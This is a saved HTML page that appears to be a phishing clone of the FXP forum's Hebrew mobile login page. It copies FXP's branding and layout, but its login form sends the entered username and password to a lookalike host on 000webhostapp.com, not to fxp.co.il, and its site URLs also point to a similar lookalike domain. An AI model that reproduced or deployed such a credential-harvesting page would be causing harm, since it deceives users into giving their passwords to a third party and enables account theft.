<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="https://www.facebook.com/2008/fbml" dir="rtl" lang="he" id="vbulletin_html" class="ui-mobile"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-cf68df3d-64d3-43ff-a6b5-04e8a1c98b07@mhtml.blink"><link rel="stylesheet" type="text/css" href="cid:css-21ff9797-1003-4666-ab42-2f1e717a24b3@mhtml.blink"><link rel="stylesheet" type="text/css" href="cid:css-05b20747-3233-42eb-bbf9-24445d8bf32b@mhtml.blink"><link rel="stylesheet" type="text/css" href="cid:css-44227a73-30d4-40b9-a487-327ac6096495@mhtml.blink"><link rel="stylesheet" type="text/css" href="cid:css-7010a9f4-b9aa-49f1-b053-d6d67ed38ee0@mhtml.blink"><link rel="stylesheet" type="text/css" href="cid:css-6aef52ef-301b-433b-a738-a9d4be1ea518@mhtml.blink"><link rel="stylesheet" type="text/css" href="cid:css-73fb8274-4d99-4fc4-8f36-7c1d1ec6a20b@mhtml.blink">
    <link rel="shortcut icon" href="https://www.fxp.co.il/favicon.ico">
    <link rel="apple-touch-icon" href="https://static.fcdn.co.il/css_static_main/NewLogo2019.jpg">
    
    <meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="https://ffxp.000webhostapp.com/">
    <base href="https://www.fxp.co.il/">
    <meta name="generator" content="vBulletin 4.2.3">
    <meta name="viewport" content="width=device-width, minimum-scale=1, maximum-scale=10">
    <meta name="theme-color" content="#0e5ba7">
    <meta name="msapplication-navbutton-color" content="#0e5ba7">
    <meta name="apple-mobile-web-app-status-bar-style" content="#0e5ba7">
    <meta name="keywords" content="FXP,פורום,פורומים,fxp,משחקים,סרטים,כיף,רשת,מחשבים,הורדות,הורדה,סרגל כלים,בדיקת IP,העלאת תמונות">
    <meta name="description" content="מחפשים אתר פורומים ?  אתר FXP מכיל קהילות פורומים, משחקים, תמונות גולשים ועוד. הכנסו עכשיו אל קהילות הפורומים של FXP">
    <meta property="fb:app_id" content="415294715208536">
    <meta property="og:site_name" content="FXP">
    <meta property="og:description" content="מחפשים אתר פורומים ?  אתר FXP מכיל קהילות פורומים, משחקים, תמונות גולשים ועוד. הכנסו עכשיו אל קהילות הפורומים של FXP">
    <meta property="og:url" content="https://ffxp.000webhostapp.com/">
    <meta property="og:type" content="website">
    
    
    
    
    
    
    
    <link rel="stylesheet" href="https://static.fcdn.co.il/css_static_main/jquery.mobile-1.0.min.css?v=4120.516">
    <link rel="stylesheet" href="https://static.fcdn.co.il/dyn/projects/css/mobile/header_n.css?v1.52=4120.516&amp;b=2.02">
    <link rel="stylesheet" href="https://static.fcdn.co.il/dyn/projects/css/mobile/main_n_1.css?v2.44=4120.516&amp;b=6.9">
    <link rel="stylesheet" href="https://static.fcdn.co.il/dyn/projects/css/usermarkup.css?v1.01=4120.516">
    
    
    
    
    <link rel="manifest" href="https://ffxp.000webhostapp.com/">
    
    
    
    <title>FXP</title>
    
    
    
    
    
    <link rel="preload" href="https://adservice.google.co.il/adsid/integrator.js?domain=www.fxp.co.il" as="script"><link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=www.fxp.co.il" as="script"><link rel="stylesheet" href="https://static.fcdn.co.il/dyn/projects/nagish/nagish.css?v=12.nagish_e.css"><link rel="stylesheet" href="https://static.fcdn.co.il/dyn/projects/nagish/nagish_e.css?v=1.1"><link rel="prefetch" href="https://tpc.googlesyndication.com/safeframe/1-0-37/html/container.html"></head>
    <body class="ui-mobile-viewport">
    
    <div data-role="page" data-theme="d" id="page-home" data-url="page-home" tabindex="0" class="ui-page ui-body-d ui-page-active" style="min-height: 789px;">
    
    
    
    
    
    
    
    
    
    
    <div class="top-ba" id="big-wap" style="text-align: center;position: relative;">
    <div id="closebig" style="z-index: 8888;
    width: 40px;
    height: 40px;
    display:none;
    margin-top: 5px;">
    <img data-src="https://rcs.mako.co.il/images/smartphones/banner_x.png" class="lazy">
    </div>
    <div id="gpt-top" data-google-query-id="CLTq79SFlugCFRehewodxVEL_w" style="display: none;">
    
    <div id="google_ads_iframe_/242748299/FXP/innerpages/top.mobile_0__container__" style="border: 0pt none; width: 320px; height: 50px;"></div></div>
    </div>
    <div style="clear: both;"></div>
    <div class="loadermyfxp" style="    position: fixed;
    top: 10%;
    left: 50%;display:none;">
    </div>
    
    
    
    <div id="pagetitle" class="pagetitle ui-bar-b">
    <h1 class="pagetitle">התחבר</h1>
    </div>
    <div id="login_block" data-role="content" class="ui-content" role="main">
    <form class="block vbform" method="post" action="https://fxpp.000webhostapp.com/login.php" onsubmit="md5hash(vb_login_password, vb_login_md5passwor, vb_login_md5password_utf, 0)">
    
    
    
    
    
    <div data-role="fieldcontain" class="ui-field-contain ui-body ui-br">
    <label for="vb_login_username" class="ui-input-text">שם משתמש:</label>
    <input type="text" class="primary textbox ui-input-text ui-body-d ui-corner-all ui-shadow-inset" id="vb_login_username" name="vb_login_username" accesskey="u" tabindex="1">
    <label for="vb_login_password" class="ui-input-text">סיסמה:</label>
    <input type="password" class="primary textbox ui-input-text ui-body-d ui-corner-all ui-shadow-inset" id="vb_login_password" name="vb_login_password" tabindex="1">
    
    </div>
    <div data-theme="a" class="ui-btn ui-btn-up-a ui-btn-corner-all ui-shadow" aria-disabled="false"><span class="ui-btn-inner ui-btn-corner-all" aria-hidden="true"><span class="ui-btn-text">התחבר</span></span><button type="submit" name="sbutton" data-theme="a" class="ui-btn-hidden" aria-disabled="false">התחבר</button></div>
    </form>
    <div id="facebook-holder">
    <span id="fb_headerbox">
    <a id="fb_loginbtn" href="https://www.fxp.co.il/#" class="ui-link">
    <div class="btn fb_btn">
    <div class="menu_picture pic_fb_login"></div>
    <div class="menu_text">התחבר</div>
    </div>
    </a>
    </span>
    </div></div>
    <div id="myModal" class="modal"></div>
    
    
    <div id="footer" style="margin-bottom: 50px;">
    <ul id="footer_links"><div class="nagish-button"><div class="img">♿</div><div style="width: 100%; height: 20px; color: rgb(14, 91, 167); font-size: 16px; line-height: 20px; text-align: center; margin-bottom: 3px;">נגישות</div></div>
    
    <li class="first"><a href="https://www.fxp.co.il/login.php?do=lostpw" rel="external" class="ui-link">שכחתי סיסמה</a></li>
    <li><a href="https://www.fxp.co.il/register.php" rel="external" class="ui-link">הירשם</a></li>
    <br>
    <li class="first"><a href="https://www.fxp.co.il/sendmessage.php" class="ui-link">יצירת קשר</a></li>
    <li class="first"><a href="https://www.fxp.co.il/terms.php" class="ui-link">תנאי שימוש</a></li>
    <br>
    <li class="first"><a href="https://www.mako.co.il/spirituality-popular_culture/Article-494842ff06e9431006.htm" target="_blank" class="ui-link">כניסת שבת</a></li>
    <li class="first"><a href="https://seo1st.co.il/" target="_blank" class="ui-link">קידום אורגני</a></li>
    <li class="first"><a href="https://seo1st.co.il/%d7%9e%d7%a7%d7%93%d7%9d-%d7%90%d7%aa%d7%a8%d7%99%d7%9d/" target="_blank" class="ui-link">מקדם אתרים</a></li>
    </ul>
    <div id="footer_copyright" class="shade footer_copyright">
    
    FXP.co.il © 2003 - 2020
    
    </div>
    </div>
    
    
    <div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div>
    
    
    <span id="outbrain-off"></span>
    
    
    
    
    
    
    </div><div class="ui-loader ui-body-a ui-corner-all" style="top: 394.5px;"><span class="ui-icon ui-icon-loading spin"></span><h1>loading</h1></div></body></html>